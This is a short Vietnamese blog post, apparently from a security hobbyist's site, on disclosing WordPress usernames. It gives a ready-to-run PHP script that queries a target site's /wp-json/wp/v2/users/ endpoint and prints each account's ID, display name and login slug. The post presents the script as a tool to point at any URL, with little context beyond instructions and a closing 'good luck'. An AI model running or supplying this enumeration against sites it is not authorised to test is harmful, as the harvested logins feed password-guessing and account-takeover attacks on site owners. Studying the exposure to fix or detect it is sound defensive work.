---
title: Tiết lộ Người Dùng WordPress
date: 23/06/2021
layout: single
header:
  teaser: /assets/images/wordpress.png
--- 


## Mô Tả 
Tiết lộ các tài khoản WordPress thông qua `/wp-json/wp/v2/users/` sử dụng php để dump tên tài khoản, và họ tên đăng bài 



## Hướng dẫn
Thay đổi url trong đoạn code dưới đây 
```shell 
php file.php
```
[![Language](https://img.shields.io/badge/Lang-php-blue.svg)](https://www.php.net/  )
```php
#!usr/bin/php
<?php
header ('Content-type: text/html; charset=UTF-8');


$url= "http://tagert"; # url 
$payload="/wp-json/wp/v2/users/";
$urli = file_get_contents($url.$payload);
$json = json_decode($urli, true);
if($json){
    echo "*-----------------------------*\n";
foreach($json as $users){
    echo "[*] ID :  |" .$users['id']     ."|\n";
    echo "[*] Name: |" .$users['name']   ."|\n";
    echo "[*] User :|" .$users['slug']   ."|\n";
    echo "\n";
}echo "*-----------------------------*";} 
else{echo "[*] No user";}


?>

```
![](https://www8.0zz0.com/2021/07/15/15/128822449.jpg)


## Chúc may mắn :D

